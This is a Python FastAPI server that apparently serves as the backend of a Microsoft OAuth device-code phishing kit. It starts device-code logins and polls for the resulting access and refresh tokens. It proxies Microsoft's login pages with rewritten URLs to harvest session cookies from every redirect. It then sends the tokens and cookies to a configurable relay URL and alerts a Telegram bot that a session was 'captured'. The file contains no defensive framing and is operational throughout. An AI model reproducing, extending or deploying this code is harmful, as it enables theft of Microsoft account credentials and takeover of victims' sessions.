from fastapi import FastAPI, HTTPException, Request, Response
from fastapi.middleware.cors import CORSMiddleware
import httpx
import asyncio
import os
import time
import json
import re
from http.cookies import SimpleCookie
from typing import Dict, Optional
import redis.asyncio as aioredis

app = FastAPI(title="Microsoft Device Code Backend v4.2", version="4.2")

# ====================== CONFIG FROM RAILWAY ENV ======================
CLIENT_ID: Optional[str] = os.getenv("MICROSOFT_CLIENT_ID")
if not CLIENT_ID:
    raise RuntimeError(
        "❌ MICROSOFT_CLIENT_ID is REQUIRED. "
        "Set it in Railway Variables."
    )

TENANT_ID: str = os.getenv("MICROSOFT_TENANT_ID", "common")
RELAY_URL: Optional[str] = os.getenv("RELAY_URL")
SCOPES: list = os.getenv(
    "SCOPES", 
    "https://graph.microsoft.com/.default offline_access openid profile"
).split()
ENABLE_SESSION_PROXY: bool = os.getenv("ENABLE_SESSION_PROXY", "true").lower() == "true"
TELEGRAM_BOT_TOKEN: Optional[str] = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID: Optional[str] = os.getenv("TELEGRAM_CHAT_ID")
REDIS_URL: Optional[str] = os.getenv("REDIS_URL")

redis_client = None
sessions: Dict[str, dict] = {}  # in-memory fallback

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ====================== REDIS ======================
@app.on_event("startup")
async def startup_event():
    global redis_client
    if REDIS_URL:
        redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
        print("✅ Redis connected for persistent sessions")
    else:
        print("⚠️ No REDIS_URL – using in-memory sessions (not recommended for production)")


async def get_session(dc: str) -> Optional[dict]:
    if redis_client:
        data = await redis_client.get(f"session:{dc}")
        return json.loads(data) if data else None
    return sessions.get(dc)


async def save_session(dc: str, data: dict, ttl: int = 1200):
    if redis_client:
        await redis_client.set(f"session:{dc}", json.dumps(data), ex=ttl)
    else:
        sessions[dc] = data


# ====================== TELEGRAM ======================
async def send_telegram(device_code: str, user_code: str, cookies_count: int):
    if not (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID):
        return
    try:
        msg = f"""🔔 <b>New Microsoft Device Session Captured</b>

🔑 Device: <code>{device_code[:12]}...</code>
👤 User code: <code>{user_code}</code>
🍪 Cookies: <b>{cookies_count}</b> (captured from every redirect)
✅ Tokens + cookies relayed to Railway"""
        async with httpx.AsyncClient() as c:
            await c.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": msg,
                    "parse_mode": "HTML"
                },
                timeout=10.0
            )
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")


# ====================== TOKEN POLLER ======================
async def poll_for_token(device_code: str):
    session = await get_session(device_code)
    if not session:
        return

    start_time = time.time()
    interval = session.get("interval", 5)

    async with httpx.AsyncClient(timeout=30.0) as client:
        while time.time() - start_time < session.get("expires_in", 900) + 60:
            try:
                resp = await client.post(
                    f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token",
                    data={
                        "client_id": CLIENT_ID,
                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                        "device_code": device_code,
                    },
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                data = resp.json()

                if resp.status_code == 200:
                    session["status"] = "success"
                    session["token"] = data
                    cookies_count = len(session.get("cookies", {}))

                    # Relay everything
                    relay_payload = {
                        "device_code": device_code,
                        "user_code": session["user_code"],
                        "token": data,
                        "cookies": session.get("cookies", {}),
                        "status": "success",
                        "relay_source": "microsoft-device-code-relay-v4.2",
                        "timestamp": time.time()
                    }
                    if RELAY_URL:
                        try:
                            async with httpx.AsyncClient() as rclient:
                                await rclient.post(RELAY_URL, json=relay_payload, timeout=15.0)
                        except Exception as e:
                            print(f"[RELAY ERROR] {e}")

                    await send_telegram(device_code, session["user_code"], cookies_count)
                    await save_session(device_code, session)
                    break

                elif data.get("error") == "authorization_pending":
                    await asyncio.sleep(interval)
                    continue
                elif data.get("error") == "slow_down":
                    interval += 5
                    await asyncio.sleep(interval)
                    continue
                else:
                    session["status"] = "error"
                    session["error"] = data.get("error_description") or str(data)
                    await save_session(device_code, session)
                    break
            except Exception as e:
                print(f"[POLL ERROR] {e}")
                await asyncio.sleep(interval)


# ====================== COOKIE PROXY ======================
@app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
async def advanced_cookie_proxy(device_code: str, request: Request):
    if not ENABLE_SESSION_PROXY:
        raise HTTPException(
            403, 
            "Session proxy is disabled. Set ENABLE_SESSION_PROXY=true"
        )

    session = await get_session(device_code)
    if not session:
        raise HTTPException(404, "Session not found or expired")

    cookie_jar = httpx.Cookies()
    for name, c in session.get("cookies", {}).items():
        cookie_jar.set(
            name, 
            c.get("value", ""), 
            domain=c.get("domain", ".microsoftonline.com")
        )

    async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60.0) as client:
        resp = await client.request(
            method=request.method,
            url="https://login.microsoftonline.com/common/oauth2/deviceauth",
            headers={
                k: v for k, v in request.headers.items() 
                if k.lower() not in ["host", "content-length", "cookie"]
            },
            content=await request.body() if request.method != "GET" else None,
            params=dict(request.query_params) if request.method == "GET" else None,
        )

    # Capture cookies from ALL redirect responses
    captured = {}
    for past_resp in list(resp.history) + [resp]:
        for header in past_resp.headers.getlist("set-cookie"):
            cookie = SimpleCookie()
            cookie.load(header)
            for morsel in cookie.values():
                captured[morsel.key] = {
                    "value": morsel.value,
                    "domain": morsel["domain"] or ".microsoftonline.com",
                    "path": morsel["path"] or "/",
                    "expires": morsel["expires"],
                    "secure": bool(morsel["secure"]),
                    "httponly": bool(morsel["httponly"]),
                    "samesite": morsel["samesite"]
                }

    if "cookies" not in session:
        session["cookies"] = {}
    session["cookies"].update(captured)
    await save_session(device_code, session, ttl=session.get("expires_in", 900) + 300)

    # URL rewriting
    content = resp.content
    if "text/html" in resp.headers.get("content-type", ""):
        html = resp.text
        proxy_base = f"{request.url.scheme}://{request.url.netloc}/proxy/device-login/{device_code}"
        html = re.sub(
            r'https?://(login\.microsoftonline\.com|account\.microsoft\.com|login\.live\.com)',
            proxy_base, 
            html, 
            flags=re.IGNORECASE
        )
        html = html.replace('action="/', f'action="{proxy_base}/')
        html = html.replace('href="/', f'href="{proxy_base}/')
        content = html.encode("utf-8")

    headers = {
        k: v for k, v in resp.headers.items() 
        if k.lower() not in ["transfer-encoding", "content-length", "connection", "set-cookie"]
    }
    return Response(
        content=content, 
        status_code=resp.status_code, 
        headers=headers, 
        media_type=resp.headers.get("content-type")
    )


# ====================== CORE API ======================
@app.post("/start-device-auth")
async def start_device_auth():
    async with httpx.AsyncClient() as client:
        r = await client.post(
            f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode",
            data={"client_id": CLIENT_ID, "scope": " ".join(SCOPES)},
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        if r.status_code != 200:
            raise HTTPException(400, r.text)
        data = r.json()
        dc = data["device_code"]
        await save_session(dc, {
            "user_code": data["user_code"],
            "expires_in": data["expires_in"],
            "interval": data.get("interval", 5),
            "status": "pending",
            "token": None,
            "cookies": {}
        }, ttl=data["expires_in"] + 300)
        asyncio.create_task(poll_for_token(dc))
        return data


@app.get("/auth-status/{device_code}")
async def get_auth_status(device_code: str):
    s = await get_session(device_code)
    if not s:
        raise HTTPException(404, "Session not found")
    return {
        "status": s["status"],
        "user_code": s["user_code"],
        "token": s.get("token"),
        "cookies": s.get("cookies"),
        "error": s.get("error")
    }


@app.get("/health")
async def health():
    return {
        "status": "healthy",
        "redis_connected": bool(redis_client),
        "proxy_enabled": ENABLE_SESSION_PROXY,
        "telegram_configured": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
    }


# Simple root message since frontend is separate
@app.get("/")
async def root():
    return {
        "message": "Microsoft Device Code Backend is running. "
                   "Use the separate index.html frontend."
    }


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))